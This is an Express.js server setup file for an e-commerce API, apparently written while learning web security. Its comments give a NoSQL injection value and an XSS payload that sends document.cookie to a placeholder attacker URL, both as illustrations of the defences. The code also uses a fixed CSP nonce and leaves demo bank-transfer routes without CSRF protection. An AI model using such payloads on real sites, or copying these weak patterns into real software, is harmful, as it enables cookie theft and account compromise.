require("express-async-errors");
const express = require("express");
const connectDB = require("./db/connect");
const app = express();
const morgan = require("morgan");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const fileUpload = require("express-fileupload");
// const bodyParser = require('body-parser');
// app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json()); // middleware for handling json body, express have their own body parser.
app.use(morgan("dev")); // for debuging each and every route only in development mode
// app.use(cookieParser());
app.use(cookieParser(process.env.JWT_SECRET_KEY));
app.use(
  cors({
    credentials: true,
    origin: ["https://my-front-end-app.netlify.app", "http://localhost:3000"],
    allowedHeaders: ["Content-Type", "csrfToken"],
  })
);
const bodyParser = require("body-parser");

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));

app.use(fileUpload());
// Also read about cloudinary upload widget
// Cloudinary's Node.js SDK wraps Cloudinary's upload API and simplifies the integration.
const cloudinary = require("cloudinary").v2;
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.CLOUD_API_KEY,
  api_secret: process.env.CLOUD_API_SECRET,
});

// Data Sanitization against NoSQL Query Injection
// Ex:- "email": {"$gt":""}, any random email will be accepted
const mongoSantize = require("express-mongo-sanitize");
app.use(mongoSantize());
// Data Sanitization against XSS
// Ex: <script>fetch(hackerUrl, document.cookie)</script>
// Adds this as a innerText instead of innerHTML in the DOM which actually runs the script
const xss = require("xss-clean");
app.use(xss());

// routers
const { appRouter } = require("./routes/authRouter");
const { notFound } = require("./middlewares/notFound");
const errorHandlerMiddleware = require("./middlewares/allErrorsHandler");
const CustomError = require("./customError");
const { usersRouter } = require("./routes/usersRouter");
const { StatusCodes } = require("http-status-codes");
const { productsRouter } = require("./routes/productsRouter");
const { reviewsRouter } = require("./routes/reviewsRouter");
const { imageRouter } = require("./routes/imageRouter");
const { authorizeUser } = require("./middlewares/authMiddleware");
const REDIS_CLIENT = require("./utils/redis");

// app.get("/", (req, res) => {
//   res.status(StatusCodes.OK).json({ msg: "with CSRF Token, Health Route working fine" });
// });

const crypto = require("crypto");
app.use((req, res, next) => {
  // Define Content Security Policy rules
  // https://www.youtube.com/watch?v=ryYVW3-kGE0
  // https://www.youtube.com/watch?v=OQ3uQqVCD-s
  // In this video protected resource means index.html page
  // index.html page should not execute hacker written comments in <script></script>
  let CSP_Rules = "default-src 'self' ;";
  // instead of setting nonce or sha hashes, we can also add 'unsafe-inline', but this is very unsecure
  CSP_Rules += "script-src 'self' 'nonce-hadIUhaudhbhShh' 'sha256-I4pcbOuaPxFwaxfhVjFYNP1QVpPnoXIH4rHZnMVF9ac=' ;";
  CSP_Rules += "frame-src 'self' https://www.jiotv.com;";
  CSP_Rules += "frame-ancestors 'self';";

  // here CSP errors will be reported to /report/data api, this is useful
  CSP_Rules += "report-uri /report/data;";
  // The HTTP Content-Security-Policy-Report-Only response header
  // allows web developers to experiment with policies by monitoring
  // (but not enforcing) their effects. These violation reports consist
  // of JSON documents sent via an HTTP POST request to the specified URI
  // defined in a Reporting-Endpoints HTTP response header.

  res.setHeader("Content-Security-Policy", CSP_Rules);

  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-Frame-Options", "SAMEORIGIN");
  // res.setHeader("Content-Security-Policy", "frame-ancestors 'none';"); ==> DENY
  // res.setHeader("Content-Security-Policy", "frame-ancestors 'self';"); ==> SAMEORIGIN
  // res.setHeader("Content-Security-Policy", "frame-ancestors 'self' 'my-another-trusted-domain.com';");
  // you can also have wildcard * for above
  // so CSP >>> X-Frame-Options in modern browsers. You should have both because legacy browser support is required

  next();
}, express.static("uploads"));

app.get("/cookie-check", (req, res) => {
  console.log(req.cookies);
  console.log(req.signedCookies);
  throw new CustomError("Checking Custom Error", StatusCodes.BAD_REQUEST);
});

// ================ bank amount transfer
app.post("/bank-transfer", authorizeUser, (req, res) => {
  const { amount, account } = req.body;
  res.status(StatusCodes.CREATED).json({ msg: "Bank Transfer Successfull", amount, account });
});
app.get("/bank-transfer", authorizeUser, (req, res) => {
  res.status(StatusCodes.OK).json({ msg: "Bank Transfer Get request" });
});
// =============== bank amount transfer

// routes
app.use("/api/v1/auth", appRouter);
app.use("/api/v1/users", usersRouter);
app.use("/api/v1/products", productsRouter);
app.use("/api/v1/reviews", reviewsRouter);
app.use("/api/v1/images", imageRouter);

app.use(errorHandlerMiddleware); // all errors will come here
app.use(notFound);

const start = async () => {
  try {
    // const URI = "mongodb://localhost:27017/e-commerce";
    // await connectDB(URI);
    await connectDB(process.env.MONGODB_URI);
    app.listen(process.env.PORT || 5000, () => {
      console.log(`APIs are running on port ${process.env.PORT}`);
    });
    if (!REDIS_CLIENT.isOpen) {
      // REDIS_CLIENT.connect();
      console.log("Connected to Redis");
    }
  } catch (error) {
    console.log("SOMETHING WENT WRONG IN STARTING THE APP");
  }
};

start();

// export default app;
